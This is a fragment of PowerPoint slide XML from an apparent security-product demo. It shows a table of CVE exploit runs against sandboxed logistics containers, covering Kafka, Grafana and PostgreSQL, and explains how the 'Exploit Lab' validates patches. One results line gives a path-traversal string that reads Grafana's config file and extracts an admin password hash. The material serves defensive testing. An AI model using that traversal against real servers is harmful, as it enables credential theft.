            <a:off x="3584447" y="4352544"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1203 Client Exec</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="4352544"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="4352544"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>31%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="4352544"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0.9s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="4352544"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kafka JMX RCE blocked — SASL partially mitigates. Metadata still exposed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Rectangle 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4572000"/>
            <a:ext cx="11978639"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92608" y="4608576"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="4608576"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-43798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="4608576"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1552 Unsecured Creds</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="4608576"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="4608576"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>96%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="4608576"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1.2s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="4608576"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana /../../../etc/grafana/grafana.ini read. Admin password hash extracted.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Rectangle 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4828032"/>
            <a:ext cx="11978639"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92608" y="4864608"/>
            <a:ext cx="1783079" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sandbox-logistics-006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2167127" y="4864608"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2024-0985</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584447" y="4864608"/>
            <a:ext cx="1143000" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1611 Container Escape</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4818887" y="4864608"/>
            <a:ext cx="822960" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733287" y="4864608"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>22%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693407" y="4864608"/>
            <a:ext cx="749808" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4.5s</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534655" y="4864608"/>
            <a:ext cx="4645152" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL priv-esc chain incomplete — superuser flag not set in this config.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Rectangle 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5193792"/>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28600" y="5230368"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  How the Exploit Lab Works — Step by Step</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5458968"/>
            <a:ext cx="2194560" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Step 1 — Select CVE:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="5458968"/>
            <a:ext cx="9464040" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>From the open vulnerability list. Only CVEs with a known exploit module are shown in the launcher.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5715000"/>
            <a:ext cx="2194560" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Step 2 — Choose Mode:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="5715000"/>
            <a:ext cx="9464040" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dry Run: simulates payload construction and evaluates exploitability without real execution. Live: full exploit chain runs against an isolated container clone. Both modes are safe — no production systems are touched.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5971032"/>
            <a:ext cx="2194560" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Step 3 — Execution:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="5971032"/>
            <a:ext cx="9464040" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The AI engine selects the correct exploit module, injects the payload, and records stdout/stderr in real time.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="TextBox 99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6227064"/>
            <a:ext cx="2194560" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Step 4 — Record Result:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="6227064"/>
            <a:ext cx="9464040" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Success/Blocked verdict, confidence score (0–1), duration in ms, MITRE technique, and full terminal log.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6483096"/>
            <a:ext cx="2194560" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Step 5 — Re-run to Verify:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="6483096"/>
            <a:ext cx="9464040" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>After a patch is merged, re-run the same simulation. If it now returns BLOCKED, the patch is verified effective.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Logistics Lab</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Industry-specific live exploit lab — run real CVE attacks against actual running Docker services</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Logistics Lab is the most interactive page in the GlobalShip demo. Unlike the generic Exploit Lab which simulates exploits in abstract sandboxes, the Logistics Lab runs exploit modules directly against the six actual Docker containers that are running as part of the logistics infrastructure stack. Each service card shows the live container status (UP with port number or DOWN), the specific CVE it is vulnerable to, the CVSS severity, a description of the exploit technique, and a Run Exploit button. When you click Run Exploit, the backend connects to the live container and attempts the real attack. The result (EXPLOITED or BLOCKED), confidence percentage, and duration appear immediately. The Run All Exploits button fires all six in sequence — showing the full attack surface in one pass. The bottom section shows which patches have been applied (logistics-patches branch) and what each fix does to harden the service.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2176272"/>
            <a:ext cx="2926080" cy="749808"/>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76272"/>
            <a:ext cx="292608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67712"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Docker Services Running</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2450592"/>
            <a:ext cx="2706624" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6 / 6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2706624"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All containers healthy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3246120" y="2176272"/>
            <a:ext cx="2926080" cy="749808"/>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2176272"/>
            <a:ext cx="292608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5848" y="2267712"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
